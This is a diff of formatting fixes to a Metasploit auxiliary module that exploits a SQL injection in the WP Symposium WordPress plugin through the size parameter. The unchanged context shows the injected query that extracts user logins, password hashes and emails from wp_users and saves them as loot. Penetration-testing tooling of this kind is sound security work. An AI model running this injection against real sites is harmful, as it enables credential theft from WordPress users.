@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -12,11 +13,11 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(
       info,
       'Name'            => 'WordPress Symposium Plugin SQL Injection',
-      'Description'     => %q{
+      'Description'     => %q(
         This module exploits a SQL injection vulnerability in the WP Symposium plugin
         before 15.8 for WordPress, which allows remote attackers to extract credentials
         via the size parameter to get_album_item.php.
-      },
+      ),
       'Author'          =>
         [
           'PizzaHatHacker',                       # Vulnerability discovery
@@ -29,12 +30,13 @@ class MetasploitModule < Msf::Auxiliary
           ['EDB', '37824']
         ],
       'DisclosureDate'  => 'Aug 18 2015'
-      ))
+    ))
 
     register_options(
       [
         OptString.new('URI_PLUGIN', [true, 'The WordPress Symposium Plugin URI', 'wp-symposium'])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def check
@@ -79,7 +81,7 @@ class MetasploitModule < Msf::Auxiliary
       module_fullname: fullname,
       username: opts[:user],
       private_data: opts[:password],
-      private_type: :nonreplayable_hash,
+      private_type: :nonreplayable_hash
     }.merge(service_data)
 
     login_data = {
@@ -115,20 +117,20 @@ class MetasploitModule < Msf::Auxiliary
 
     vprint_status("#{peer} - Trying to retrieve the users informations...")
     for user_id in first_id..last_id
-      separator = Rex::Text.rand_text_numeric(7,bad='0')
+      separator = Rex::Text.rand_text_numeric(7, bad = '0')
       user_info = send_sql_request("concat_ws(#{separator},user_login,user_pass,user_email) from wp_users where id = #{user_id} ; --")
 
       if user_info.nil?
         vprint_error("#{peer} - Failed to retrieve the users info")
         return
       else
-        values = user_info.split("#{separator}")
+        values = user_info.split(separator.to_s)
 
         user_login = values[0]
         user_pass  = values[1]
         user_email = values[2]
 
-        print_good("#{peer} - #{sprintf("%-15s %-34s %s", user_login, user_pass, user_email)}")
+        print_good("#{peer} - #{sprintf('%-15s %-34s %s', user_login, user_pass, user_email)}")
         report_cred(
           ip: rhost,
           port: datastore['RPORT'],
@@ -143,7 +145,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     unless credentials.empty?
-      loot = store_loot("wp_symposium.http","text/plain", rhost, credentials)
+      loot = store_loot("wp_symposium.http", "text/plain", rhost, credentials)
       vprint_status("Credentials saved in: #{loot}")
     end
   end
